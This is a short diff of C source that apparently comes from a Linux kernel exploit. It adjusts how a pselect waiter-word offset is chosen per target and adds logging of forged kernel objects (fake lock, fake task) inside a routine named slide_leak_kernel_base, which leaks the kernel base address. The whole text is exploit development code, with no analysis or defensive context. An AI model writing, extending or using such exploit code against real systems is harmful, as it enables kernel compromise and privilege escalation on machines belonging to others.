@@ -44,8 +44,13 @@ int slide_pselect_words_per_set(void) {
   return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
 }
 
+static int slide_pselect_waiter_shift(void) {
+  return active_offsets ? active_offsets->pselect_waiter_shift
+                        : PSELECT_WAITER_WORD_SHIFT;
+}
+
 int slide_pselect_global_word(int waiter_word) {
-  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
+  return slide_pselect_waiter_shift() + waiter_word;
 }
 
 int slide_pselect_put_global_word(
@@ -179,6 +184,9 @@ void slide_pselect_stack_copy(void) {
   fd_set out;
   fd_set ex;
   prepare_slide_pselect_fdsets(&in, &out, &ex);
+  pr_info("slide pselect setup shift=%d page=%016zx fake_lock=%016zx "
+          "fake_w0=%016zx fake_task=%016zx\n",
+          slide_pselect_waiter_shift(), page_base, fake_lock, fake_w0, fake_task);
   open_slide_selected_fds(&in, &out, &ex, high_read);
 
   atomic_store(&slide_consume_stop, 0);
@@ -434,6 +442,9 @@ int slide_leak_kernel_base(void) {
     if (!page_base || !fake_lock) {
       continue;
     }
+
+    pr_info("slide attempt %d uses pselect shift=%d\n",
+            attempt, slide_pselect_waiter_shift());
 
     int raw_fds[2];
     SYSCHK(pipe(raw_fds));
